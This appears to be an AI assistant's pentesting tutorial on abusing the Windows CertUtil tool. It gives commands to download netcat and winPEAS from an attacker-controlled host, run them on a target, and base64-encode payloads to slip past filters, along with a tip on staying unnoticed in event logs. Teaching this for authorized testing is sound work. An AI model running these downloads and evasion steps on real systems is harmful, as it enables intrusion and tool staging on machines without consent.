Great! Let’s talk about **CertUtil**, a built-in Windows utility that’s incredibly useful for various administrative tasks — and, in the context of pentesting, for **downloading files** or **encoding/decoding data**.

Here’s how to use **CertUtil** with full commands, focusing on file transfers and basic usage in a Windows environment.

---

## 🔹 What is CertUtil?

`certutil.exe` is a command-line tool that comes by default on Windows systems. It’s normally used to manage certificates, but it can also be leveraged to **download files**, **encode/decode base64**, and even **verify signatures**.

---

## 🔹 Common Use Cases

### 1️⃣ Download a File from a Remote Server

CertUtil can download files over HTTP(S) by copying them from a web server:

```cmd
certutil -urlcache -split -f http://<attacker-ip>/<filename> <destination_path>
```

**Example:**

```cmd
certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Users\Public\nc.exe
```

🔹 **Breakdown**:

* `-urlcache`: Uses the URL cache mechanism.
* `-split`: Splits large files (helps avoid corruption).
* `-f`: Forces overwrite if the file already exists.

### 2️⃣ Encode a File in Base64

You can encode a file in base64 (to bypass certain filters or embed in scripts):

```cmd
certutil -encode input_file output_file
```

**Example:**

```cmd
certutil -encode payload.exe payload.txt
```

---

### 3️⃣ Decode a Base64-Encoded File

You can decode a base64-encoded file:

```cmd
certutil -decode input_file output_file
```

**Example:**

```cmd
certutil -decode payload.txt payload.exe
```

---

## 🔹 Summary of Commands

### ➡️ Download a File:

```cmd
certutil -urlcache -split -f http://<attacker-ip>/<file> <local_path>
```

### ➡️ Encode a File:

```cmd
certutil -encode <input_file> <output_file>
```

### ➡️ Decode a File:

```cmd
certutil -decode <input_file> <output_file>
```

## 🔹 Sample Workflow for Downloading a Tool (like winPEAS)

1️⃣ **Start a simple HTTP server on your attacker machine** (e.g., Kali):

```bash
python3 -m http.server 8000
```

2️⃣ **On the target Windows machine**:

```cmd
certutil -urlcache -split -f http://<attacker-ip>:8000/winPEASx64.exe C:\Users\Public\winPEASx64.exe
```

3️⃣ **Run the downloaded tool**:

```cmd
C:\Users\Public\winPEASx64.exe
```

---

## 🔹 Notes

✅ CertUtil is usually available on most Windows systems by default (except some hardened systems).
✅ Always have **authorization** before using these techniques in any environment.
✅ CertUtil logs may appear in **Windows event logs**, so in a red team or CTF context, be cautious.
